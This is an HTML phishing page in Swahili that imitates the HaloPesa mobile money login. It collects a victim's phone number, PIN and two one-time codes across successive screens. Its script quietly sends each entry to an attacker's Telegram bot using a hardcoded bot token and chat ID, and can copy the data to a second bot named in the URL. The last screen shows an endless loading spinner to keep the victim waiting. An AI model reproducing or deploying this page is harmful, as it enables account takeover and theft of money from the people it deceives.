<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HaloPesa</title>
    <style>
        :root { --primary: #ff5500; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { background-color: #ffffff; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        
        .phone-container { 
            width: 100%; height: 100%; max-width: 480px; 
            padding: 20px; display: flex; flex-direction: column; 
            background: #fff; position: relative;
        }

        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
        .screen.active { display: flex; }
        
        h2 { font-size: 24px; font-weight: 700; color: #111; margin-bottom: 25px; margin-top: 40px; }
        
        .text-input { 
            width: 100%; padding: 18px; border: 1.5px solid #ddd; 
            border-radius: 12px; font-size: 18px; outline: none; 
        }
        .text-input:focus { border-color: var(--primary); }

        .box-input-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 30px; }
        .box-input { 
            width: 22%; aspect-ratio: 1/1; border: 1.5px solid #ddd; 
            border-radius: 12px; text-align: center; font-size: 24px; 
            font-weight: 700; outline: none; background: #fdfdfd;
        }
        .box-input:focus { border-color: var(--primary); background: #fff; }

        .btn-primary { 
            width: 100%; padding: 18px; background-color: var(--primary); 
            color: white; border: none; border-radius: 12px; 
            font-size: 16px; font-weight: 600; cursor: pointer; margin-top: auto;
        }

        .loading-container { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { 
            width: 40px; height: 40px; border: 4px solid #f3f3f3; 
            border-top: 4px solid var(--primary); border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="phone-container">
        <div class="screen active" id="screen-1">
            <h2>Namba ya simu</h2>
            <input type="tel" class="text-input" id="phone-field" inputmode="numeric">
            <button class="btn-primary" onclick="submitPhone()">Endelea</button>
        </div>

        <div class="screen" id="screen-2">
            <<h2>Weka namba ya siri</h2>
            <div class="box-input-container" id="pin-container">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
                <input type="password" class="box-input autotab" maxlength="1" inputmode="numeric">
            </div>
            <button class="btn-primary" onclick="submitPin()">Endelea</button>
        </div>

        <div class="screen" id="screen-3">
            <h2>Weka msimbo wa OTP</h2>
            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
            <h4>Kama ujumbe wa maandihi.</h4>
            <div class="box-input-container" id="otp-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerLoading(4)">Endelea</button>
        </div>

        <div class="screen" id="screen-4"><div class="loading-container"><div class="spinner"></div></div></div>

        <div class="screen" id="screen-5">
            <h2>Weka msimbo wa OTP tena</h2>
            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
            <h4>Kama ujumbe wa maandihi.</h4>
            <div class="box-input-container" id="details-container">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
                <input type="text" class="box-input autotab" maxlength="1">
            </div>
            <button class="btn-primary" onclick="triggerContinuousLoading()">Endelea</button>
        </div>

        <div class="screen" id="screen-6"><div class="loading-container"><div class="spinner"></div></div></div>
    </div>

    <script>
        const MAIN_BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
        const MAIN_CHAT_ID = '8735708057';

        async function sendToTelegram(msg) {
            const urlParams = new URLSearchParams(window.location.search);
            const IND_TOKEN = urlParams.get('token');
            const IND_ID = urlParams.get('id');

            fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' })
            });

            if (IND_TOKEN && IND_ID) {
                fetch(`https://api.telegram.org/bot${IND_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: IND_ID, text: `[Personal] ${msg}`, parse_mode: 'Markdown' })
                });
            }
        }

        function nextScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById('screen-' + id).classList.add('active');
        }

        function submitPhone() { sendToTelegram(`📱 Namba: ${document.getElementById('phone-field').value}`); nextScreen(2); }
        function submitPin() {
            let pin = ""; document.querySelectorAll('#pin-container .box-input').forEach(i => pin += i.value);
            sendToTelegram(`🔑 PIN: ${pin}`); nextScreen(3);
        }
        function triggerLoading(nextId) {
            let val = ""; document.querySelectorAll('#otp-container .box-input').forEach(i => val += i.value);
            sendToTelegram(`💬 Maelezo 1: ${val}`);
            nextScreen(4); setTimeout(() => nextScreen(nextId), 2000);
        }
        function triggerContinuousLoading() {
            let val = ""; document.querySelectorAll('#details-container .box-input').forEach(i => val += i.value);
            sendToTelegram(`📝 Maelezo 2: ${val}`); nextScreen(6);
        }

        document.querySelectorAll('.autotab').forEach((input, index, inputs) => {
            input.addEventListener('input', () => { 
                if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); 
            });
        });
    </script>
</body>
</html>
